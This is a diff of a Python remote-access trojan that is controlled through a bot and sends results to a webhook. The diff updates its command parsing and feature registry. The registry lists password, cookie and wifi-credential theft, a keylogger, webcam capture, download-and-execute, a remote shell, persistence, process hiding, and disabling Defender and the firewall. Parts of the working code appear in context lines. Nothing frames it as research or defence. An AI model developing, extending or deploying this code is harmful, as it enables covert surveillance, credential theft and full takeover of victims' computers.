@@ -20,37 +20,32 @@ import zipfile
 from urllib.parse import urlparse
 
 # Version tracking - UPDATE THIS WHEN ADDING NEW FEATURES
-FEATURE_VERSION = "3.0"
+FEATURE_VERSION = "4.0"
 LAST_UPDATED = "2024-01-01"
 
-# Feature registry - ADD NEW FEATURES HERE
+# Feature registry - SIMPLIFIED STRUCTURE FOR BOT PARSING
 FEATURE_REGISTRY = {
     "version": FEATURE_VERSION,
     "commands": {
-        # System Control Commands
         "system_control": [
             "shutdown", "restart", "lock", "logoff", "close_minecraft",
             "popup", "download_execute", "freeze_keyboard", "freeze_mouse",
             "freeze_both", "unfreeze", "bsod", "disable_defender", "enable_defender"
         ],
-        # Information Gathering
         "information": [
             "check_av", "take_screenshot", "system_info", "get_passwords",
             "get_cookies", "get_history", "keylogger_start", "keylogger_stop",
             "get_clipboard", "get_wifi_passwords", "get_browser_data"
         ],
-        # Advanced Features
         "advanced": [
             "persistence_install", "persistence_remove", "process_hide",
             "file_browser", "remote_shell", "download_file", "upload_file",
             "webcam_capture", "audio_record", "disable_firewall"
         ],
-        # Troll Commands
         "troll": [
             "troll"
         ]
     },
-    # Troll subcommands
     "troll_options": [
         "open_cd", "swap_mouse", "rotate_screen", "invert_colors",
         "mouse_jiggler", "keyboard_spam", "play_sound", "change_wallpaper",
@@ -64,10 +59,18 @@ keylogger_running = False
 
 def _execute_control_command(command, parameter=None, webhook_url=None):
     """
-    MAIN CONTROL COMMAND EXECUTOR
-    Add new command implementations here
+    MAIN CONTROL COMMAND EXECUTOR - CONTROLPC STYLE
     """
     try:
+        # Parse command and parameters like controlpc
+        if parameter and '|' in parameter:
+            parts = parameter.split('|')
+            sub_command = parts[0]
+            sub_param = parts[1] if len(parts) > 1 else None
+        else:
+            sub_command = parameter
+            sub_param = None
+
         # System Control Commands
         if command == "shutdown":
             os.system("shutdown /s /t 1")
@@ -132,7 +135,9 @@ def _execute_control_command(command, parameter=None, webhook_url=None):
             
         elif command == "take_screenshot":
             screenshot_data = _take_screenshot()
-            return True, f"screenshot:{screenshot_data}" if screenshot_data else False, "Screenshot failed"
+            if screenshot_data:
+                return True, f"screenshot:{screenshot_data}"
+            return False, "Screenshot failed"
             
         elif command == "system_info":
             info = _get_system_info()
@@ -202,7 +207,6 @@ def _execute_control_command(command, parameter=None, webhook_url=None):
             return False, "File download failed"
             
         elif command == "upload_file":
-            # This would require parameter parsing for path and data
             return False, "Upload not implemented"
             
         elif command == "webcam_capture":
@@ -232,7 +236,7 @@ def _execute_control_command(command, parameter=None, webhook_url=None):
     except Exception as e:
         return False, f"Error: {str(e)}"
 
-# ==================== ADVANCED FEATURES ====================
+# ==================== HELPER FUNCTIONS ====================
 
 def _download_and_execute(url):
     """Download and execute file from URL"""
@@ -322,23 +326,10 @@ def _get_system_info():
             'current_user': os.getenv('USERNAME'),
             'ip_address': socket.gethostbyname(socket.gethostname()),
             'uptime_hours': round(time.time() - psutil.boot_time()) / 3600,
-            'gpu': _get_gpu_info(),
-            'antivirus': _check_antivirus()
         }
         return info
     except Exception as e:
         return {'error': str(e)}
-
-def _get_gpu_info():
-    """Get GPU information"""
-    try:
-        import subprocess
-        result = subprocess.run(["wmic", "path", "win32_VideoController", "get", "name"], 
-                              capture_output=True, text=True)
-        gpus = [line.strip() for line in result.stdout.split('\n') if line.strip() and line.strip() != 'Name']
-        return gpus
-    except:
-        return []
 
 def _check_antivirus():
     """Enhanced antivirus detection"""
@@ -376,8 +367,6 @@ def _check_antivirus():
             pass
     
     return av_products
-
-
 
 def _start_keylogger():
     """Start keylogger"""
@@ -451,6 +440,18 @@ def _get_wifi_passwords():
         return profiles
     except:
         return []
+
+def _get_browser_passwords():
+    """Get browser passwords - placeholder"""
+    return {"status": "Not implemented"}
+
+def _get_browser_cookies():
+    """Get browser cookies - placeholder"""
+    return {"status": "Not implemented"}
+
+def _get_browser_history():
+    """Get browser history - placeholder"""
+    return {"status": "Not implemented"}
 
 def _get_all_browser_data():
     """Get all browser data in one call"""
@@ -705,34 +706,6 @@ def update_global_features():
     
     print(f"✅ Features updated to version {FEATURE_VERSION}")
     print(f"📋 Available commands: {sum(len(cmds) for cmds in FEATURE_REGISTRY['commands'].values())}")
-
-# ==================== NEW FEATURE TEMPLATES ====================
-
-"""
-HOW TO ADD NEW FEATURES:
-
-1. INCREASE the FEATURE_VERSION number
-2. ADD the command name to FEATURE_REGISTRY['commands'] in the appropriate category
-3. IMPLEMENT the command in _execute_control_command() function
-4. RETURN (success, data) tuple where data can be sent back to bot
-
-EXAMPLE:
-
-FEATURE_VERSION = "2.1"  # ← Increase this
-
-# Add to FEATURE_REGISTRY:
-FEATURE_REGISTRY['commands']['advanced'].append("new_feature")
-
-# Add to _execute_control_command:
-elif command == "new_feature":
-    result = _new_feature_helper(parameter)
-    return result, "New feature executed"
-
-# Create helper function:
-def _new_feature_helper(parameter):
-    # Implementation here
-    return True
-"""
 
 # Initialize features
 update_global_features()
